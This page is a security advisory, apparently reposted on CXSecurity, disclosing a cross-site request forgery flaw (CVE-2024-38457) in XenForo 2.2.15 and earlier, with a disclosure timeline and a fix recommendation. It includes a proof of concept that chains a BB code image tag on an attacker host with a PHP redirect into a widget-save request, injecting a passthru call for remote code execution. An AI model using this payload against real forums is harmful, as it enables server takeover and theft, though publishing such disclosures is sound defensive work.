---
title: XenForo 2.2.15 Cross Site Request Forgery
url: https://cxsecurity.com/issue/WLB-2024070036
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-07-18
fetch_date: 2025-10-06T17:38:27.433626
---

# XenForo 2.2.15 Cross Site Request Forgery

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **XenForo 2.2.15 Cross Site Request Forgery** **2024.07.17**  Credit:  **[EgiX](https://cxsecurity.com/author/EgiX/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-38457](https://cxsecurity.com/cveshow/CVE-2024-38457/ "Click to see CVE-2024-38457")**  CWE: **[CWE-352](https://cxsecurity.com/cwe/CWE-352 "Click to see CWE-352")** | |

-------------------------------------------------------------------------------
XenForo <= 2.2.15 (Widget::actionSave) Cross-Site Request Forgery Vulnerability
-------------------------------------------------------------------------------
[-] Software Link:
https://xenforo.com
[-] Affected Versions:
Version 2.2.15 and prior versions.
[-] Vulnerability Description:
The XF\Admin\Controller\Widget::actionSave() method, defined into the
/src/XF/Admin/Controller/Widget.php script, does not check whether the
current HTTP request is a POST or a GET before saving a widget.
XenForo does perform anti-CSRF checks for POST requests only, as such
this method can be abused in a Cross-Site Request Forgery (CSRF)
attack to create/modify arbitrary XenForo widgets via GET requests,
and this can also be exploited in tandem with KIS-2024-06 to perform
CSRF-based Remote Code Execution (RCE) attacks.
Furthermore, XenForo implements a BB code system, as such this
vulnerability could also be exploited through "Stored CSRF" attacks by
abusing the [img] BB code tag, creating a thread or a private message
(to be sent to the victim user) like the following:
[img]https://attacker.website/exploit.php[/img]
Where the exploit.php script hosted on the attacker-controlled website
could be something like this:
<?php
$url = "https://victim.website/xenforo/";
header("Location:
{$url}admin.php?widgets/save&definition\_id=html&widget\_key=RCE&positions[pub\_sidebar\_top]=1&display\_condition=true&options[template]={{\$xf.app.em.getRepository('XF\\Util\\Arr').filterRecursive(['id'],'passthru')}}");
?>
Successful exploitation of this vulnerability requires a victim user
with permissions to administer styles or widgets to be currently
logged into the Admin Control Panel.
[-] Solution:
Update to a fixed version or apply the vendor patches.
[-] Disclosure Timeline:
[22/02/2024] - Vulnerability details sent to SSD Secure Disclosure
[05/06/2024] - Vendor released patches and fixed versions
[14/06/2024] - CVE identifier requested
[16/06/2024] - CVE identifier assigned
[16/07/2024] - Coordinated public disclosure
[-] CVE Reference:
The Common Vulnerabilities and Exposures project (cve.mitre.org) has
assigned the name CVE-2024-38457 to this vulnerability.
[-] Credits:
Vulnerability discovered by Egidio Romano.
[-] Other References:
https://xenforo.com/community/threads/222133
https://ssd-disclosure.com/ssd-advisory-xenforo-rce-via-csrf/
[-] Original Advisory:
http://karmainsecurity.com/KIS-2024-05

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024070036)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top